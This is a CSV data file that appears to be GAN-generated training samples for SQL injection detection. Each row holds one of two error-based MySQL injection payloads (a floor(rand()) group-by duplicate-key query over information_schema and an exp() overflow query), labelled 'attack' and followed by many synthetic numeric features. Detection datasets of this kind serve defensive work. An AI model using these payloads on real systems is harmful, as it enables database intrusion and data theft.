id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000467,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.284985080875114,275.3079528808594,77.25548553466797,39.39921569824219,102.02448272705078,2.962103843688965,90.35277557373047,38.30057907104492,0.9006775617599487,0.289345383644104,0.15676602721214294,0.3912844657897949,0.12420456111431122,3.7939319610595703,1.1527342796325684,1.0214920043945312,0.5188413858413696,0.07178155332803726,-0.04622243344783783,0.05049045383930206,9.901040077209473,9.452942848205566,3.4782602787017822,0.1341334581375122,1.7249685525894165,0.3224034607410431,0.1639949381351471,0.09734073281288147,0.18778854608535767,1.112930417060852,-0.0046266429126262665,-0.09182776510715485,1.932291030883789,0.06994836777448654,0.27458012104034424,2.023681163787842,7.6583099365234375,0.9620090126991272,2.90818452835083,0.6077607274055481,0.4758368730545044,1.1240990161895752,0.12737461924552917,0.026029929518699646,0.2804906964302063,-0.2088342159986496,-0.08866351842880249,0.37293925881385803,0.3007564842700958,0.4570452570915222,0.1927238553762436,0.24523873627185822,-0.041657619178295135,0.1499972641468048,0.45597848296165466,0.03453758731484413,0.0665091946721077,-0.040387000888586044,0.05999092757701874,0.20430874824523926,-0.05051696300506592,-0.008689653128385544,-0.10066971927881241,-0.07268750667572021,0.1172519251704216,0.0026133544743061066,0.6896347999572754,0.3213147222995758,0.06474988907575607,-0.10305291414260864,-0.13488611578941345,-0.20080384612083435,-0.02605053409934044,0.02253449708223343,0.02082754485309124,-0.04912970960140228,1.128221869468689,0.2244536429643631,-0.07176677137613297,0.06352546811103821,0.4975990951061249,9.122353553771973,0.8486942052841187,0.27932602167129517,-0.023714913055300713,0.7700874209403992,0.09959959238767624,0.022348638623952866,0.02032780647277832
GAN_000468,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.156886476718029,274.5371398925781,81.77528381347656,40.271461486816406,105.0218505859375,-1.6724886894226074,80.37333679199219,39.849517822265625,0.9610026478767395,0.2824189066886902,0.16512060165405273,0.3899601399898529,0.12797752022743225,3.7688255310058594,1.5733872652053833,1.0809993743896484,0.6028019189834595,0.17630474269390106,0.10980016738176346,0.38756266236305237,9.896897315979004,9.415610313415527,4.4700212478637695,-0.07419456541538239,1.6404341459274292,0.3260808289051056,-0.06810805946588516,-0.07082024216651917,0.12485738098621368,1.3117972612380981,-0.20163701474666595,-0.17010992765426636,1.9179123640060425,0.20771212875843048,0.3494124114513397,2.1061127185821533,7.924343585968018,0.8606922626495361,3.27974796295166,0.4045100510120392,0.40980759263038635,1.1133825778961182,-0.09453278034925461,-4.629972318070941e-05,0.14499981701374054,-0.210856094956398,-0.11770694702863693,0.3540649712085724,0.3645562529563904,0.43664565682411194,0.015149046666920185,0.22182080149650574,0.10586397349834442,0.13178366422653198,0.3918403685092926,0.032015953212976456,0.13528099656105042,0.05039984732866287,0.14836494624614716,0.14476262032985687,-0.011077791452407837,-0.12863126397132874,-0.1985991895198822,0.12870684266090393,0.07206197082996368,-0.04486227035522461,0.7065465450286865,0.28522247076034546,0.22723720967769623,0.2342677116394043,-0.2460174560546875,-0.2200630009174347,0.05106346309185028,0.2005336582660675,0.036539189517498016,-0.1299481838941574,1.4642820358276367,0.32050493359565735,-0.29082605242729187,-0.030320733785629272,0.5737849473953247,9.412944793701172,0.9646326303482056,0.34852099418640137,-0.02904406748712063,0.785903811454773,0.08876650035381317,0.25821202993392944,-0.08259162306785583
GAN_000469,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.171521406524019,274.0819396972656,80.64796447753906,41.10041046142578,103.07459259033203,0.2537503242492676,84.17369842529297,38.6989631652832,1.3783254623413086,0.2873750925064087,0.16143380105495453,0.3908758759498596,0.12555070221424103,3.7280681133270264,1.4267895221710205,0.9438990950584412,0.5598572492599487,0.16246972978115082,-0.19593967497348785,0.09645894169807434,10.063516616821289,9.431035041809082,3.882840394973755,0.11764559149742126,1.7488421201705933,0.2526057958602905,0.09968310594558716,0.11209194362163544,0.012886090204119682,1.0453215837478638,-0.11513718962669373,0.059167779982089996,1.9636220932006836,0.2681552767753601,0.36221861839294434,2.113926649093628,7.46482515335083,0.7743127346038818,3.0889861583709717,0.7583723068237305,0.4501743018627167,1.0937950611114502,-0.04555556923151016,-0.020651860162615776,0.15451845526695251,-0.07354995608329773,-0.3036952018737793,0.2886562645435333,0.29445740580558777,0.3528665006160736,-0.01792151853442192,0.24534235894680023,-0.17451229691505432,0.14247235655784607,0.49049073457717896,-0.004592391196638346,0.11931735277175903,-0.004208685830235481,0.22984184324741364,0.20690491795539856,-0.13800424337387085,-0.0014509707689285278,-0.042924605309963226,-0.024990778416395187,0.10996926575899124,0.0878257229924202,0.8378679156303406,0.033657804131507874,0.05687775835394859,-0.113729327917099,0.0037277527153491974,-0.2201799601316452,-0.07714435458183289,0.0665455237030983,0.02547902800142765,0.0814090371131897,1.1927024126052856,0.39115825295448303,-0.19441446661949158,0.027455218136310577,0.4789171516895294,9.344619750976562,0.8411540389060974,0.34075120091438293,-0.027582908049225807,0.6959492564201355,-0.181025892496109,0.10285548865795135,-0.09555842727422714
GAN_000470,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.339343964160286,273.1968994140625,76.32046508789062,39.25407791137695,102.04696655273438,3.2191834449768066,85.98358917236328,37.811866760253906,1.089544415473938,0.2902948260307312,0.16271567344665527,0.3992604911327362,0.12286712229251862,3.7669119834899902,0.6371587514877319,1.3651859760284424,0.5381549000740051,0.1699908822774887,0.08473504334688187,0.0579134076833725,9.646267890930176,9.491828918457031,3.405679225921631,0.06843811273574829,1.8337657451629639,0.34841692447662354,0.029481280595064163,0.09190090000629425,0.1855120062828064,1.096213936805725,0.004345424473285675,-0.11614863574504852,2.0385239124298096,-0.1875201165676117,0.2574818432331085,2.1634159088134766,8.138033866882324,1.095902919769287,3.1553847789764404,0.5140836238861084,0.3299165368080139,1.0113091468811035,-0.0570744052529335,0.044402364641427994,0.14388659596443176,-0.4970579147338867,-0.11714676767587662,0.3956352472305298,0.3644830584526062,0.39189985394477844,0.1823267787694931,0.08805005997419357,-0.2268247902393341,0.3712669610977173,0.4300243556499481,0.022308258339762688,0.10927118360996246,0.028528418391942978,-0.0667523518204689,0.05907788500189781,0.11856367439031601,-0.2476804256439209,-0.38523438572883606,0.06630542874336243,0.14338895678520203,-0.0788370743393898,0.7913300395011902,0.2294280230998993,0.14027082920074463,0.1638348549604416,0.06737226992845535,-0.15101689100265503,-0.025809776037931442,0.0012780576944351196,0.05933281034231186,-0.0005784742534160614,1.237412452697754,0.32813143730163574,-0.06319297105073929,0.1471274048089981,0.5837602019309998,9.21899127960205,0.7774832844734192,0.2817840874195099,0.0065186601132154465,0.8014242649078369,0.11752326041460037,-0.19925011694431305,-0.1634129136800766
GAN_000471,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.418918723656055,276.3833312988281,76.15131378173828,41.1238899230957,104.58121490478516,-3.020017623901367,90.55776977539062,40.25715637207031,1.333281397819519,0.2856014668941498,0.16106769442558289,0.3912273943424225,0.13005022704601288,3.778165817260742,1.5831999778747559,1.2062604427337646,0.5238726139068604,0.18606612086296082,-0.17424164712429047,0.36958304047584534,10.276179313659668,8.960366249084473,4.035475730895996,-0.09374180436134338,1.7439846992492676,0.2875886857509613,-0.01649525947868824,-0.034698694944381714,0.023669680580496788,1.2944103479385376,-0.058999042958021164,-0.2521834969520569,1.9608701467514038,0.17266200482845306,0.32014212012290955,2.149294376373291,7.567397117614746,0.5816004872322083,3.3709747791290283,0.7991546988487244,0.4966285824775696,1.0449937582015991,0.019794516265392303,-0.0009372997446916997,0.2532711923122406,0.03864441066980362,-0.2732354402542114,0.4148061275482178,0.25072646141052246,0.4178808331489563,0.05732779577374458,0.31398171186447144,-0.13191884756088257,0.015215069055557251,0.4816109240055084,-0.023429343476891518,0.028644712641835213,-0.1059928834438324,0.283253014087677,0.1326591819524765,-0.11810970306396484,0.11944516003131866,-0.22238558530807495,0.13975632190704346,0.08182837814092636,-0.03489873558282852,0.7167822122573853,0.42641904950141907,0.15954402089118958,-0.09571978449821472,-0.13550424575805664,-0.028842180967330933,0.048718202859163284,0.2815978527069092,0.053098417818546295,0.03332602232694626,1.1249862909317017,0.24602894484996796,-0.20802849531173706,0.007955633103847504,0.5139374136924744,9.565284729003906,0.9212225079536438,0.35984712839126587,-0.04674631729722023,0.7732749581336975,-0.09857834130525589,0.4322810471057892,-0.12980778515338898
GAN_000472,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.2568693704294445,273.47845458984375,77.6501235961914,42.58598327636719,104.73265838623047,-0.7259130477905273,84.08907318115234,39.360347747802734,1.2313258647918701,0.28003162145614624,0.16427172720432281,0.39104223251342773,0.12846273183822632,3.7533862590789795,1.726991891860962,0.9723295569419861,0.6493933200836182,0.20784235000610352,-0.09718286246061325,0.26379266381263733,9.769057273864746,9.496922492980957,4.183199405670166,-0.025217965245246887,1.703813076019287,0.3073205351829529,-0.0776643455028534,0.09178151190280914,0.12238898873329163,1.2371891736984253,-0.06018359586596489,-0.1998947560787201,2.012131690979004,0.35870444774627686,0.2876480519771576,2.1222896575927734,7.485159873962402,0.6951007843017578,2.948277711868286,0.5553837418556213,0.454894095659256,1.0442564487457275,0.0968899056315422,-0.0013766009360551834,0.19341209530830383,-0.02146487683057785,-0.18494991958141327,0.3747727572917938,0.32521164417266846,0.40420565009117126,0.07272271066904068,0.3150137960910797,0.00046184659004211426,-0.00453433021903038,0.4152246117591858,0.06803146004676819,0.12476510554552078,0.13337820768356323,0.028665512800216675,-0.017497092485427856,-0.11421610414981842,0.07295738160610199,-0.05084269493818283,0.11056404560804367,0.0682692676782608,-0.02315978705883026,0.7452085018157959,0.11938729882240295,0.19428212940692902,0.05226887762546539,-0.17408117651939392,-0.2232006937265396,-0.058154407888650894,0.1786620318889618,0.028169890865683556,0.11429278552532196,1.2640541791915894,0.25350716710090637,-0.20426517724990845,0.03169257938861847,0.4884829521179199,9.510747909545898,0.8639234900474548,0.3502510190010071,-0.04988851025700569,0.72568279504776,-0.10240001976490021,0.2648283541202545,-0.1634729504585266
GAN_000473,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.422994863587201,271.4643249511719,76.9266128540039,39.84552764892578,102.84504699707031,-4.302458763122559,85.71337127685547,39.736236572265625,1.1085903644561768,0.2930028438568115,0.16943243145942688,0.38981306552886963,0.12971453368663788,3.758838415145874,1.526472568511963,0.8910441398620605,0.46774446964263916,0.20645169913768768,-0.06717026233673096,0.5544278621673584,9.77576732635498,8.75619888305664,4.017667770385742,-0.1333925873041153,1.6771657466888428,0.32046616077423096,-0.1434839367866516,0.011193008162081242,0.12455927580595016,1.2180787324905396,-0.06220671162009239,-0.28767073154449463,1.8944023847579956,0.19393256306648254,0.26260337233543396,2.123185634613037,7.76571798324585,0.8831413984298706,3.193829298019409,0.8096362948417664,0.34660613536834717,1.0532740354537964,0.07460964471101761,0.01796666346490383,0.2153244912624359,-0.1969219595193863,-0.07731722295284271,0.45257818698883057,0.25803351402282715,0.40696027874946594,0.10543715208768845,0.19194857776165009,-0.0934409350156784,-0.02595936879515648,0.42015910148620605,0.017912110313773155,0.046840135008096695,0.030118025839328766,0.040159717202186584,0.23797708749771118,-0.14473165571689606,-0.12212014198303223,-0.14779406785964966,0.31619980931282043,0.09642589837312698,-0.044046301394701004,0.6965750455856323,0.4440663754940033,0.1423572152853012,-0.01744730770587921,-0.04120346158742905,-0.17214031517505646,0.0857517421245575,0.22140252590179443,0.04406565800309181,-0.006024561822414398,1.2457314729690552,0.24996501207351685,-0.281770795583725,0.08155187964439392,0.5451450347900391,9.434995651245117,0.869189977645874,0.34542515873908997,-0.03701977804303169,0.7941902279853821,-0.0006697066128253937,0.14234937727451324,-0.3161225914955139
GAN_000474,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.098960480530733,273.1675109863281,81.25215148925781,41.19284439086914,105.08453369140625,2.6296253204345703,82.89076232910156,36.295475006103516,0.9296166300773621,0.3039960563182831,0.1539614200592041,0.3909623622894287,0.12416606396436691,3.786475896835327,1.4506222009658813,1.0371572971343994,0.5573341846466064,0.08529362827539444,0.054945044219493866,-0.015062603168189526,9.621098518371582,9.804577827453613,4.033699989318848,0.0891117975115776,1.7668431997299194,0.25563517212867737,0.0724840983748436,0.11835616827011108,0.1278199404478073,1.119713544845581,-0.07507936656475067,-0.06798131763935089,2.054348945617676,-0.009114984422922134,0.3242374658584595,2.1023731231689453,7.777182102203369,1.1266080141067505,2.995392322540283,0.4244326651096344,0.42433109879493713,0.9858328700065613,-0.00508648157119751,0.03428305312991142,0.10012674331665039,-0.1219361424446106,-0.09826423972845078,0.32156676054000854,0.3453529477119446,0.3889026343822479,0.15866808593273163,0.2635060250759125,-0.04874558746814728,0.13947966694831848,0.4323097765445709,0.06313302367925644,0.15286581218242645,-0.0595138818025589,0.09612135589122772,0.24734151363372803,-7.509440183639526e-05,-0.05571112036705017,-0.014308378100395203,-0.028056379407644272,0.0709441751241684,-0.0321502611041069,0.7512885332107544,0.09722012281417847,0.09341827780008316,0.07110659033060074,-0.10114072263240814,-0.06474267691373825,0.04986158758401871,0.063692606985569,0.020920652896165848,-0.10508272051811218,1.2018370628356934,0.4123326241970062,-0.029353991150856018,0.04687511920928955,0.4443592429161072,9.514871597290039,0.778329610824585,0.2640061378479004,0.01925366185605526,0.7391870617866516,0.017974402755498886,-0.027711957693099976,0.084761843085289
GAN_000475,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.408296656092976,280.79693603515625,76.77915954589844,40.39742660522461,105.89735412597656,-2.3169121742248535,90.37541961669922,41.02277755737305,0.861178994178772,0.26537638902664185,0.15325620770454407,0.39073917269706726,0.125339537858963,3.7499866485595703,1.2795820236206055,1.6241662502288818,0.6075596213340759,0.11317788809537888,0.08371715247631073,0.10968828201293945,10.143451690673828,9.729843139648438,3.9187254905700684,0.04465820640325546,1.6559211015701294,0.3180629014968872,0.10929255187511444,-0.24032041430473328,0.17721997201442719,1.3628203868865967,-0.20534028112888336,-0.04595019668340683,1.797566294670105,0.20899319648742676,0.33386385440826416,2.0806221961975098,7.8908610343933105,0.8199578523635864,3.3173391819000244,0.45738980174064636,0.5351701974868774,1.290871262550354,-0.17576125264167786,-0.006760483607649803,0.38655656576156616,-0.2892928123474121,-0.2130846381187439,0.4051947295665741,0.337867796421051,0.5420929789543152,-0.019646774977445602,0.22282350063323975,-0.04346667230129242,0.38709646463394165,0.4412462115287781,-0.03163644298911095,0.053074683994054794,0.12759900093078613,0.36656850576400757,0.2633233368396759,0.050944142043590546,-0.003538258373737335,-0.3426026701927185,-0.16727322340011597,0.11291906237602234,-0.10173849761486053,0.6996217370033264,0.5369127988815308,0.19830428063869476,0.1369134783744812,-0.3937779664993286,-0.14195430278778076,0.10243627429008484,0.18368422985076904,0.050451718270778656,-0.13015849888324738,1.5004621744155884,0.18504086136817932,-0.21199703216552734,-0.05388520658016205,0.5173667669296265,9.120498657226562,1.000821590423584,0.3441944420337677,-0.05086784437298775,0.7107889652252197,0.19010189175605774,0.25503331422805786,-0.019723176956176758
GAN_000476,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.332765923363837,275.8245849609375,75.95570373535156,40.11982727050781,97.54234313964844,-2.2198219299316406,90.48622131347656,40.75095748901367,1.0895103216171265,0.2818429470062256,0.16992038488388062,0.39222750067710876,0.126625657081604,3.7668673992156982,1.2595174312591553,1.0281085968017578,0.4739275872707367,0.17749062180519104,-0.09644941985607147,0.12507934868335724,10.064725875854492,9.25497055053711,3.4015657901763916,-0.07004474103450775,1.7237403392791748,0.27669164538383484,0.03303897753357887,-0.007380782626569271,0.08163469284772873,1.1251124143600464,-0.004352319985628128,-0.08168435096740723,1.9437882900238037,0.09984664618968964,0.3280315697193146,2.217764377593994,7.900001049041748,0.9748181700706482,3.1779022216796875,0.7969555854797363,0.38838091492652893,1.0753390789031982,-0.042767174541950226,0.0014859642833471298,0.21056994795799255,-0.1447475552558899,-0.10305485129356384,0.34370458126068115,0.3225500285625458,0.4258177876472473,-0.005645494442433119,0.15532800555229187,-0.15334708988666534,0.14855533838272095,0.4169412851333618,0.0005228345398791134,0.09153948724269867,0.14935579895973206,0.10430960357189178,0.33552125096321106,-0.06394674628973007,-0.12783309817314148,-0.18034809827804565,0.20262658596038818,0.13019870221614838,-0.1032954752445221,0.787316083908081,0.22255322337150574,-0.0074393413960933685,-0.15203963220119476,0.09795710444450378,-0.07154843956232071,0.1567816287279129,0.20604008436203003,0.03622060269117355,-0.05790828913450241,1.2863388061523438,0.3439193069934845,-0.3095628321170807,0.09118343144655228,0.5068960785865784,9.571407318115234,0.8650535941123962,0.3341744542121887,-0.003839569166302681,0.7710582613945007,0.08670102804899216,-0.04684566333889961,-0.1259518712759018
GAN_000477,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.115890902743018,271.594970703125,77.73380279541016,40.562618255615234,102.70668029785156,0.9083967208862305,84.88048553466797,39.57975387573242,0.9212862849235535,0.28036776185035706,0.16573195159435272,0.3875065743923187,0.12663739919662476,3.7695116996765137,1.396367073059082,0.8534412980079651,0.5421948432922363,0.16206273436546326,-0.0006893472746014595,0.08814821392297745,9.746942520141602,9.4876708984375,3.89914870262146,0.03551831468939781,1.6998555660247803,0.3360193967819214,-0.08188480138778687,0.0012632020516321063,0.13684849441051483,1.2728385925292969,-0.1062905341386795,-0.21047791838645935,1.9898183345794678,0.09986986219882965,0.2886437475681305,2.1770455837249756,8.08548355102539,0.8896381855010986,2.993678569793701,0.40465518832206726,0.46968188881874084,1.0521270036697388,0.051757894456386566,-0.004008343443274498,0.20997199416160583,-0.1475895494222641,-0.010345831513404846,0.2828524708747864,0.3635621964931488,0.43767303228378296,0.03911234810948372,0.21998585760593414,0.09816645085811615,0.11219597607851028,0.4376038610935211,0.050422947853803635,0.11573368310928345,0.04783792793750763,0.06422552466392517,0.17841309309005737,-0.08030124008655548,-0.09871421754360199,-0.07302818447351456,0.15746068954467773,0.0680176392197609,0.03621937334537506,0.7202053666114807,0.14591825008392334,0.16739891469478607,0.0986340269446373,-0.23036128282546997,-0.14136257767677307,0.10614301264286041,0.13378910720348358,0.02099534496665001,-0.05249394476413727,1.3780829906463623,0.31413733959198,-0.2407996952533722,0.061236947774887085,0.5665457844734192,9.792431831359863,0.9041768312454224,0.32127174735069275,0.005524285137653351,0.7244479656219482,0.08531777560710907,0.18011924624443054,0.07574041187763214
GAN_000478,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.4797132762326966,282.7552185058594,85.43330383300781,39.717288970947266,103.88555908203125,-1.9256649017333984,83.87200164794922,41.48848342895508,1.3740845918655396,0.26480457186698914,0.1623014360666275,0.3931635022163391,0.12602993845939636,3.7083961963653564,1.6187167167663574,1.6761741638183594,0.8011829257011414,0.14033643901348114,-0.1626308262348175,0.23649217188358307,10.117152214050293,9.132356643676758,4.124457359313965,-0.1441744863986969,1.7097139358520508,0.2694138288497925,0.17667104303836823,-0.04306834936141968,0.11378921568393707,1.2652080059051514,-0.14859095215797424,0.03432215005159378,2.0293164253234863,0.4839698374271393,0.37777259945869446,2.0399627685546875,6.92594575881958,0.6809951663017273,3.2954533100128174,0.6418812274932861,0.4653559625148773,1.1344709396362305,-0.07964525371789932,0.016167931258678436,0.17476311326026917,-0.22738666832447052,-0.29789623618125916,0.42689719796180725,0.23344004154205322,0.3967321515083313,-0.03924713656306267,0.3673701584339142,-0.24561452865600586,0.23698154091835022,0.4147098660469055,0.026303892955183983,0.1211531013250351,-0.0504511222243309,0.353338360786438,0.010406199842691422,-0.13528989255428314,0.22546619176864624,-0.1615999937057495,0.013582389801740646,0.10804130882024765,-0.16131722927093506,0.841718316078186,0.3102889060974121,0.2608523368835449,0.054143186658620834,-0.08032287657260895,-0.36404868960380554,-0.08990803360939026,0.20769831538200378,0.05236903578042984,0.047031622380018234,1.2902053594589233,0.2545081377029419,-0.3136499524116516,-0.14152516424655914,0.5190934538841248,8.669577598571777,0.9694061279296875,0.3695998191833496,-0.07948896288871765,0.780544638633728,0.030057698488235474,0.294525682926178,-0.06146978959441185
GAN_000479,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.139590427809087,272.2660217285156,78.74313354492188,42.67593765258789,103.3926773071289,0.25598907470703125,86.05999755859375,37.38471221923828,1.0606098175048828,0.28615546226501465,0.16159801185131073,0.39269161224365234,0.12580926716327667,3.7197206020355225,1.511037826538086,1.0419979095458984,0.6784146428108215,0.153732568025589,-0.02423613891005516,0.18895021080970764,9.14500904083252,9.957483291625977,3.967557191848755,0.0017068833112716675,1.6914615631103516,0.27019256353378296,-0.06634847819805145,0.1657746583223343,0.18154370784759521,1.0999242067337036,-0.06935447454452515,-0.08554188907146454,2.1128458976745605,0.2704744338989258,0.32698124647140503,2.1946492195129395,7.712131500244141,1.0677978992462158,2.7632217407226562,0.38129520416259766,0.380818247795105,1.0190508365631104,-0.048077292740345,0.011648818850517273,0.07088930904865265,-0.07338321208953857,-0.10620205104351044,0.3849058449268341,0.3703891932964325,0.3412018120288849,0.15549713373184204,0.19927628338336945,-0.16563087701797485,0.1332150399684906,0.4257403612136841,0.09955297410488129,0.13654060661792755,0.32468774914741516,-0.08658186346292496,0.18204829096794128,0.02686295658349991,-0.018815983086824417,-0.12242031842470169,0.1705341339111328,0.10067006200551987,-0.1306699812412262,0.8159638047218323,-0.0486699715256691,0.15865738689899445,0.06879124045372009,0.00858137384057045,-0.27779144048690796,-0.04255922511219978,0.16267754137516022,0.02605832740664482,0.02008695900440216,1.3111178874969482,0.33541274070739746,-0.11733678728342056,0.06214936077594757,0.416858434677124,9.154295921325684,0.7635917067527771,0.3498935103416443,-0.017950905486941338,0.6892574429512024,-0.043076131492853165,-0.16206209361553192,-0.13058845698833466
